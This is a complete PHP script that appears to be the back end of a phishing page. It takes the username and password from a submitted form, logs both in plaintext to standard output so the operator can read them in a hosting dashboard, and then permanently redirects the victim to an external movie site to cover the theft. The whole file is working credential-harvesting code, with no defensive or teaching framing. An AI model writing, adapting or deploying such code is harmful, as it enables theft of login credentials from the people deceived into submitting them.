<?php
// Capture the incoming form data fields
$account_identifier = $_POST['username'] ?? '';
$security_token     = $_POST['password'] ?? '';

// Format the entry to include the submitted credentials
$logEntry = sprintf(
    "[%s] SUBMISSION RECEIPT - Username: %s | Password: %s\n",
    date('Y-m-d H:i:s'),
    $account_identifier,
    $security_token
);

// Stream the text directly to Render's live dashboard console stream
file_put_contents('php://stdout', $logEntry);

// Redirect the browser to the external movie site permanently
header("HTTP/1.1 301 Moved Permanently");
header("Location: https://flaxmovies.online");
exit();
?>
